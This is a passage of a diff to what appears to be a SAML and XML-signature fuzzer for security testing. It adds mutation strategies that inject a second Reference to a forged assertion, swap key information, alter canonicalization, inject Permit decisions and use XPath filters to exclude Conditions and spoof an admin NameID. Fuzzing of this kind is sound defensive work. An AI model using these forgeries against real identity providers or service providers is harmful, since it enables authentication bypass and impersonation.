+            + bytes(data[sig_end:])
+        )
+        return result
+
+    def _reference_dual_target(self, data: bytearray) -> bytearray | None:
+        """Add second Reference pointing to evil Assertion.
+
+        xmldsig-core §4.3.3: 'Reference may occur one or more times in
+        SignedInfo.' CVE-2025-29774 showed xml-crypto validates only first.
+        We add a second Reference with different URI to test selection.
+        """
+        m_ref = _RE_REFERENCE_BLOCK.search(data)
+        if not m_ref:
+            return None
+        # Create evil assertion
+        evil_assertion = _make_evil_assertion(self.rng)
+        evil_id = re.search(rb'ID="([^"]*)"', evil_assertion)
+        if not evil_id:
+            return None
+        # Build second Reference pointing to evil assertion
+        second_ref = (
+            b'<ds:Reference URI="#' + evil_id.group(1) + b'">'
+            b'<ds:Transforms>'
+            b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
+            b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
+            b'</ds:Transforms>'
+            b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
+            b'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
+            b'</ds:Reference>'
+        )
+        # Insert second Reference after original, evil assertion before Signature
+        result = bytearray(
+            bytes(data[:m_ref.end()])
+            + second_ref
+            + bytes(data[m_ref.end():])
+        )
+        # Prepend evil assertion at start of Assertion
+        m_assert = _RE_ASSERTION_OPEN.search(result)
+        if m_assert:
+            result = bytearray(
+                bytes(result[:m_assert.start()])
+                + evil_assertion
+                + bytes(result[m_assert.start():])
+            )
+        return result
+
+    def _keyinfo_keyname(self, data: bytearray) -> bytearray | None:
+        """Replace X509Data with KeyName element.
+
+        xmldsig-core §4.4.1: KeyName is Optional. Some libraries use it for
+        key lookup, others ignore. Replacing X509 cert with a KeyName tests
+        whether the library trusts embedded key identifiers.
+        """
+        m = _RE_KEYINFO.search(data)
+        if not m:
+            return None
+        replacement = self.rng.choice(KEYINFO_KEYNAME_PAYLOADS)
+        return bytearray(
+            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
+        )
+
+    def _keyinfo_retrieval_method(self, data: bytearray) -> bytearray | None:
+        """Replace X509Data with RetrievalMethod URI.
+
+        xmldsig-core §4.4.3: RetrievalMethod uses same URI dereferencing as
+        Reference. Spec warns it 'introduces security risk' via Transform
+        child elements. Some libraries follow the URI, others ignore.
+        """
+        m = _RE_KEYINFO.search(data)
+        if not m:
+            return None
+        replacement = self.rng.choice(KEYINFO_RETRIEVAL_PAYLOADS)
+        return bytearray(
+            bytes(data[:m.start()]) + replacement + bytes(data[m.end():])
+        )
+
+    def _reference_type_manifest(self, data: bytearray) -> bytearray | None:
+        """Add Type='#Manifest' attribute to Reference element.
+
+        xmldsig-core §4.3.3: Optional Type attribute hints content type.
+        Some libraries treat Type=Manifest specially, others ignore it.
+        """
+        m = _RE_REFERENCE_URI.search(data)
+        if not m:
+            return None
+        # Insert Type attribute after URI attribute
+        type_attr = b' Type="http://www.w3.org/2000/09/xmldsig#Manifest"'
+        insert_pos = m.end(3)  # after the closing quote of URI
+        return bytearray(
+            bytes(data[:insert_pos]) + type_attr + bytes(data[insert_pos:])
+        )
+
+    # ══════════════════════════════════════════════════════════════
+    # P: C14N spec-derived strategies (90-94)
+    #    Based on xml-exc-c14n §2-4, xml-c14n2
+    # ══════════════════════════════════════════════════════════════
+
+    def _c14n_prefixlist_inject(self, data: bytearray) -> bytearray | None:
+        """Inject InclusiveNamespaces PrefixList into exc-c14n Transform.
+
+        exc-c14n §4: Listed prefixes are handled with inclusive c14n rules.
+        Injecting 'saml ds #default' forces these namespaces to inherit
+        ancestor context, changing the digest. Different from _inclusive_ns_manipulate
+        which modifies EXISTING PrefixList — this injects a NEW one into
+        Transform elements that lack it.
+        """
+        if b"xml-exc-c14n#" not in data:
+            return None
+        # Find exc-c14n transform that has NO InclusiveNamespaces child
+        exc_re = re.compile(
+            rb'(<ds:Transform\s+Algorithm="http://www\.w3\.org/2001/10/xml-exc-c14n#")\s*(/?>)',
+            re.IGNORECASE | re.DOTALL,
+        )
+        m = exc_re.search(data)
+        if not m:
+            return None
+        # Check if there's already an InclusiveNamespaces nearby
+        after = bytes(data[m.end():m.end() + 200])
+        if b"InclusiveNamespaces" in after and b"</ds:Transform>" in after:
+            return None  # already has one, defer to _inclusive_ns_manipulate
+        prefix_list = self.rng.choice([
+            b"saml ds",
+            b"saml ds samlp #default",
+            b"#default",
+            b"ds xsi",
+            b"saml",
+        ])
+        inc_ns = (
+            b'<ec:InclusiveNamespaces '
+            b'xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#" '
+            b'PrefixList="' + prefix_list + b'"/>'
+        )
+        if m.group(2) == b"/>":
+            # Self-closing → open + child + close
+            new_tag = m.group(1) + b">" + inc_ns + b"</ds:Transform>"
+            return bytearray(
+                bytes(data[:m.start()]) + new_tag + bytes(data[m.end():])
+            )
+        else:
+            # Open tag → insert child after >
+            return bytearray(
+                bytes(data[:m.end()]) + inc_ns + bytes(data[m.end():])
+            )
+
+    def _c14n_qname_in_attrvalue(self, data: bytearray) -> bytearray | None:
+        """Add xsi:type QName in attribute value to test c14n namespace handling.
+
+        exc-c14n §1.1/§5: 'Implementations do not consider the appearance of a
+        namespace prefix within an attribute value to be visibly utilized.'
+        Adding xsi:type='xsd:string' where xsd: is declared on ancestor creates
+        a namespace that exclusive c14n omits but inclusive c14n includes.
+        """
+        m_assert = _RE_ASSERTION_OPEN.search(data)
+        if not m_assert:
+            return None
+        # Add xsd namespace to Assertion and xsi:type to a child
+        ns_inject = (
+            b' xmlns:xsd="http://www.w3.org/2001/XMLSchema"'
+            b' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
+        )
+        insert_pos = m_assert.end() - 1  # before >
+        result = bytearray(
+            bytes(data[:insert_pos]) + ns_inject + bytes(data[insert_pos:])
+        )
+        # Find NameID and add xsi:type attribute
+        m_nameid = re.search(rb'(<saml:NameID\b)([^>]*>)', result,
+                             re.IGNORECASE | re.DOTALL)
+        if m_nameid:
+            type_attr = b' xsi:type="xsd:string"'
+            pos = m_nameid.end(1)
+            result = bytearray(
+                bytes(result[:pos]) + type_attr + bytes(result[pos:])
+            )
+        return result
+
+    def _c14n_xml_attr_ancestor(self, data: bytearray) -> bytearray | None:
+        """Inject xml:lang or xml:space on ancestor element.
+
+        exc-c14n §3 point 1: Exclusive c14n OMITS xml: namespace attribute
+        search from ancestors. Inclusive c14n includes them. Adding xml:lang
+        to Response causes inclusive c14n to include it in Assertion digest
+        but exclusive c14n omits it, creating divergence.
+        """
+        m_resp = _RE_RESPONSE_OPEN.search(data)
+        if not m_resp:
+            return None
+        xml_attr = self.rng.choice([
+            b' xml:lang="en"',
+            b' xml:space="preserve"',
+            b' xml:lang="de"',
+            b' xml:base="https://idp.example.com/"',
+        ])
+        insert_pos = m_resp.end() - 1  # before >
+        return bytearray(
+            bytes(data[:insert_pos]) + xml_attr + bytes(data[insert_pos:])
+        )
+
+    def _c14n_default_ns_switch(self, data: bytearray) -> bytearray | None:
+        """Switch saml: prefix namespace to default namespace.
+
+        exc-c14n §3 condition 4: Default namespace rendering rules differ
+        from prefixed namespace rules. Switching xmlns:saml='...' to
+        xmlns='...' changes c14n output completely.
+        """
+        if b'xmlns:saml="' not in data:
+            return None
+        saml_ns = b"urn:oasis:names:tc:SAML:2.0:assertion"
+        # Replace xmlns:saml="..." with xmlns="..."
+        result = bytearray(data)
+        result = bytearray(bytes(result).replace(
+            b'xmlns:saml="' + saml_ns + b'"',
+            b'xmlns="' + saml_ns + b'"',
+            1,  # only first occurrence
+        ))
+        # Replace saml: prefix on elements
+        for prefix_tag in [b"saml:Assertion", b"saml:Issuer", b"saml:Subject",
+                           b"saml:NameID", b"saml:Conditions", b"saml:Audience",
+                           b"saml:AudienceRestriction", b"saml:AuthnStatement",
+                           b"saml:AuthnContext", b"saml:AuthnContextClassRef",
+                           b"saml:SubjectConfirmation", b"saml:SubjectConfirmationData",
+                           b"saml:AttributeStatement", b"saml:Attribute",
+                           b"saml:AttributeValue"]:
+            local = prefix_tag.split(b":")[1]
+            result = bytearray(bytes(result).replace(
+                b"<" + prefix_tag, b"<" + local
+            ))
+            result = bytearray(bytes(result).replace(
+                b"</" + prefix_tag, b"</" + local
+            ))
+        return result
+
+    def _c14n_2_0_algorithm_swap(self, data: bytearray) -> bytearray | None:
+        """Swap c14n algorithm to C14N 2.0 URI.
+
+        C14N 2.0 (W3C Note, not Rec): URI http://www.w3.org/2010/xml-c14n2.
+        Most libraries don't support it. Tests fallback behavior — some
+        may silently fall back to c14n 1.0, others reject.
+        """
+        c14n2_uri = b"http://www.w3.org/2010/xml-c14n2"
+        # Try CanonicalizationMethod first
+        m = _RE_C14N_METHOD.search(data)
+        if m:
+            result = bytearray(
+                bytes(data[:m.start(2)]) + c14n2_uri + bytes(data[m.end(2):])
+            )
+            # Optionally add C14N 2.0 parameters
+            if self.rng.random() < 0.5:
+                param = self.rng.choice(C14N2_PARAMS)
+                # Insert param after CanonicalizationMethod close
+                cm_close = re.search(rb'(/?>)', result[m.start():], re.IGNORECASE)
+                if cm_close and cm_close.group(1) == b"/>":
+                    pos = m.start() + cm_close.start()
+                    new_tag = (
+                        bytes(result[:pos]) + b">"
+                        + param
+                        + b"</ds:CanonicalizationMethod>"
+                        + bytes(result[pos + 2:])
+                    )
+                    result = bytearray(new_tag)
+            return result
+        return None
+
+    # ══════════════════════════════════════════════════════════════
+    # Q: SAML Core/Profiles spec-derived strategies (95-97)
+    # ══════════════════════════════════════════════════════════════
+
+    def _subject_confirmation_sender_vouches(self, data: bytearray) -> bytearray | None:
+        """Change SubjectConfirmation to sender-vouches method.
+
+        SAML Core §2.4.1.1: sender-vouches means the attesting entity
+        vouches for the subject. Most SP libraries have NO validation path
+        for this method, potentially accepting any assertion.
+        """
+        m = _RE_SUBJECT_CONFIRMATION.search(data)
+        if not m:
+            # No SubjectConfirmation — inject one
+            m_subject = re.search(rb'(</saml:Subject>)', data, re.IGNORECASE)
+            if not m_subject:
+                return None
+            inject = (
+                b'<saml:SubjectConfirmation'
+                b' Method="urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"/>'
+            )
+            return bytearray(
+                bytes(data[:m_subject.start()])
+                + inject
+                + bytes(data[m_subject.start():])
+            )
+        return bytearray(
+            bytes(data[:m.start(2)])
+            + b"urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"
+            + bytes(data[m.end(2):])
+        )
+
+    def _authz_decision_inject(self, data: bytearray) -> bytearray | None:
+        """Inject AuthzDecisionStatement with Decision='Permit'.
+
+        SAML Core §2.7.2.2: AuthzDecisionStatement carries authorization
+        decisions. Most SAML SPs only expect AuthnStatement. Injecting
+        AuthzDecisionStatement tests parser confusion and whether any
+        library interprets Decision='Permit' as authorization.
+        """
+        # Insert before </saml:Assertion>
+        m_close = _RE_ASSERTION_CLOSE.search(data)
+        if not m_close:
+            return None
+        return bytearray(
+            bytes(data[:m_close.start()])
+            + AUTHZ_DECISION_STATEMENT
+            + bytes(data[m_close.start():])
+        )
+
+    def _sso_expired_signed(self, data: bytearray) -> bytearray | None:
+        """Set NotOnOrAfter to past timestamp while keeping valid structure.
+
+        SAML Profiles §4.1.4: SSO processing checks Conditions timing.
+        Libraries that check conditions BEFORE signature reject early;
+        others verify signature first. Tests validation order divergence.
+        """
+        m = _RE_NOTONORAFTER.search(data)
+        if not m:
+            return None
+        # Set to a past date
+        past_dates = [
+            b"2020-01-01T00:00:00Z",
+            b"2000-01-01T00:00:00Z",
+            b"1970-01-01T00:00:00Z",
+        ]
+        return bytearray(
+            bytes(data[:m.start(2)])
+            + self.rng.choice(past_dates)
+            + bytes(data[m.end(2):])
+        )
+
+    # ══════════════════════════════════════════════════════════════
+    # R: XPath Filter 2.0 spec-derived strategies (98-100)
+    #    Based on W3C xmldsig-filter2
+    # ══════════════════════════════════════════════════════════════
+
+    def _xpath_filter2_subtract_conditions(self, data: bytearray) -> bytearray | None:
+        """Inject XPath Filter 2.0 subtract to exclude Conditions from digest.
+
+        xmldsig-filter2: subtract operation excludes selected subtrees from
+        digest calculation. Excluding Conditions allows expired/wrong-audience
+        assertions to pass digest verification. Also modifies Conditions to
+        exploit the exclusion.
+        """
+        m_transforms = _RE_TRANSFORMS.search(data)
+        if not m_transforms:
+            return None
+        filter_payload = self.rng.choice(XPATH_FILTER2_SUBTRACT_PAYLOADS)
+        # Insert Filter 2.0 transform before existing transforms
+        insert_pos = m_transforms.start(2)
+        result = bytearray(
+            bytes(data[:insert_pos]) + filter_payload + bytes(data[insert_pos:])
+        )
+        # If we excluded Conditions, set NotOnOrAfter to past
+        if b"Conditions" in filter_payload:
+            m_noa = _RE_NOTONORAFTER.search(result)
+            if m_noa:
+                result = bytearray(
+                    bytes(result[:m_noa.start(2)])
+                    + b"2020-01-01T00:00:00Z"
+                    + bytes(result[m_noa.end(2):])
+                )
+        # If we excluded Subject, change NameID
+        if b"Subject" in filter_payload:
+            m_nid = _RE_NAMEID.search(result)
+            if m_nid:
+                result = bytearray(
+                    bytes(result[:m_nid.start(2)])
+                    + b"admin@evil.com"
+                    + bytes(result[m_nid.end(2):])
+                )
+        return result
+
+    def _xpath_filter2_union_evil(self, data: bytearray) -> bytearray | None:
+        """Inject XPath Filter 2.0 union to include additional content in digest.
+
+        xmldsig-filter2: union adds nodes to the digest scope. Adding //*
+        includes the entire document (potentially including evil content
+        outside the Reference URI scope) in the digest calculation.
+        """
+        m_transforms = _RE_TRANSFORMS.search(data)
+        if not m_transforms:
+            return None
+        filter_payload = self.rng.choice(XPATH_FILTER2_UNION_PAYLOADS)
+        insert_pos = m_transforms.start(2)
+        return bytearray(
+            bytes(data[:insert_pos]) + filter_payload + bytes(data[insert_pos:])
+        )
+
+    def _xpath_filter2_multi_step(self, data: bytearray) -> bytearray | None:
+        """Inject multi-step XPath Filter 2.0: subtract then union.
+
+        xmldsig-filter2 Processing Model: XPath elements are evaluated
+        sequentially. First subtract Conditions, then union everything
+        back. Some libraries process in order, others may merge or skip.
+        """
+        m_transforms = _RE_TRANSFORMS.search(data)
+        if not m_transforms:
+            return None
+        # Step 1: subtract Conditions
+        # Step 2: union everything (should re-include Conditions)
+        multi_filter = (
+            b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
+            b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
+            b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+            b'//saml:Conditions'
+            b'</XPath>'
+            b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="union">'
+            b'//*'
+            b'</XPath>'
+            b'</ds:Transform>'
+        )
+        insert_pos = m_transforms.start(2)
+        return bytearray(
+            bytes(data[:insert_pos]) + multi_filter + bytes(data[insert_pos:])
+        )
+
+    # ── Feedback API (matches cookie_mutator interface) ───────
+
+    def feedback(self, strategy_name: str, signal: str) -> None:
+        """Receive feedback from engine about strategy effectiveness.
+
+        Args:
+            strategy_name: Name of the strategy that produced the result.
+            signal: "finding", "stage_up", or "coverage".
+        """
+        try:
+            idx = self._strategy_names.index(strategy_name)
+        except ValueError:
+            return
+
+        self._total_feedback_calls += 1
+
+        if signal == "finding":
+            self._strategy_finds[idx] += 1
+            self._weights[idx] = min(
+                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
+                self._base_weights[idx] * 3,
+            )
+        elif signal == "stage_up":
+            self._strategy_cov[idx] += 1
+            self._weights[idx] = min(
+                self._weights[idx] + max(self._base_weights[idx] * 15 // 100, 1),
+                self._base_weights[idx] * 3,
+            )
+        elif signal == "coverage":
+            self._strategy_cov[idx] += 1
+            self._weights[idx] = min(
+                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
+                self._base_weights[idx] * 3,
+            )
+
+        if self._total_feedback_calls % 1000 == 0:
+            for i in range(len(self._strategies)):
+                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
+                    self._weights[i] = max(self._weights[i] - 1, 1)
+
+    # Guidance field → strategy name patterns (for apply_guidance_weights)
+    _FIELD_TO_STRATEGIES: dict[str, list[str]] = {
+        # Attacker-controlled fields
+        "SignatureValue": [
+            "sig_strip", "comment_inject_sigvalue", "sigvalue_multi_comment",
+            "hmac_confusion", "golden_saml",
+        ],
+        "Reference.URI": [
+            "reference_uri", "duplicate_reference", "xpointer",
+        ],
+        "Assertion": [
+            "xsw1", "xsw2", "xsw3", "xsw4", "xsw5", "xsw7", "xsw8",
+            "xsw_envelope", "xsw_first_assertion", "xsw_signed_in_extensions",
+            "assertion_count_bomb",
+        ],
+        "NameID": [
+            "nameid_spoof", "nameid_mixed_content", "multi_nameid",
+        ],
+        "NameID.text": [
+            "nameid_spoof", "nameid_mixed_content", "multi_nameid",
+        ],
+        "NameID.children": [
+            "nameid_mixed_content", "nameid_spoof",
+        ],
+        "CanonicalizationMethod.Algorithm": [
+            "c14n_method_swap", "c14n_superfluous_ns", "c14n_inherited_ns",
+            "c14n_attr_value", "void_c14n", "inclusive_ns",
+        ],
+        "DigestMethod.Algorithm": [
+            "algo_downgrade", "digestvalue_leading_comment",
+            "digestvalue_cdata", "digestvalue_split", "digestvalue_pi",
+        ],
+        "Conditions.NotBefore": [
+            "condition_manipulation", "timestamp_manipulation",
+        ],
+        "Conditions.NotOnOrAfter": [
+            "condition_manipulation", "timestamp_manipulation",
+        ],
+        "AudienceRestriction": [
+            "audience_bypass", "condition_manipulation",
+        ],
+        "Issuer": [
+            "issuer_spoof",
+        ],
+        "Issuer.text": [
+            "issuer_spoof",
+        ],
+        "InResponseTo": [
+            "subject_confirmation_bypass",
+        ],
+        "Assertion.ID": [
+            "assertion_id_collision", "reference_uri",
+        ],
+    }
+
+    def apply_guidance_weights(self, field_weights: dict[str, float]) -> None:
+        """Apply guidance-driven weight boosts with zero-sum rebalancing.
+
+        Targeted strategies get 3-5x boost; non-targeted get attenuated
+        so targeted strategies hold ~40% of total selection probability.
+        """
+        targeted: set[int] = set()
+        for field, multiplier in field_weights.items():
+            patterns = self._FIELD_TO_STRATEGIES.get(field, [])
+            if not patterns:
+                continue
+            for i, sname in enumerate(self._strategy_names):
+                if any(pat in sname for pat in patterns):
+                    boost = 1.0 + 4.0 * multiplier  # focus=1.0→5x, secondary=0.3→2.2x
+                    self._weights[i] = min(
+                        int(self._base_weights[i] * boost),
+                        self._base_weights[i] * 6,
+                    )
+                    targeted.add(i)
+
+        if not targeted:
+            return
+
+        # Attenuate non-targeted to make boost meaningful
+        targeted_sum = sum(self._weights[i] for i in targeted)
+        non_targeted = [i for i in range(len(self._weights)) if i not in targeted]
+        non_targeted_sum = sum(self._weights[i] for i in non_targeted)
+        if non_targeted_sum > 0:
+            desired_ratio = 1.5  # targeted:non_targeted ≈ 40:60
+            scale = min(targeted_sum * desired_ratio / non_targeted_sum, 1.0)
+            for i in non_targeted:
+                self._weights[i] = max(int(self._weights[i] * scale), 1)
+
+        total = sum(self._weights)
+        t_pct = sum(self._weights[i] for i in targeted) / total * 100 if total else 0
+        _log.info(
+            "Guidance weights: %d/%d strategies targeted (%.0f%% of weight)",
+            len(targeted), len(self._strategy_names), t_pct,
+        )
+
+    def reset_weights(self, boost_zero_finds: bool = False) -> None:
+        """Reset dynamic weights — called by engine on stall detection."""
+        if boost_zero_finds:
+            for i in range(len(self._strategies)):
+                if self._strategy_finds[i] == 0:
+                    self._weights[i] = min(
+                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
+                        self._base_weights[i] * 2,
+                    )
+                else:
+                    self._weights[i] = self._base_weights[i]
+        else:
+            self._weights = list(self._base_weights)
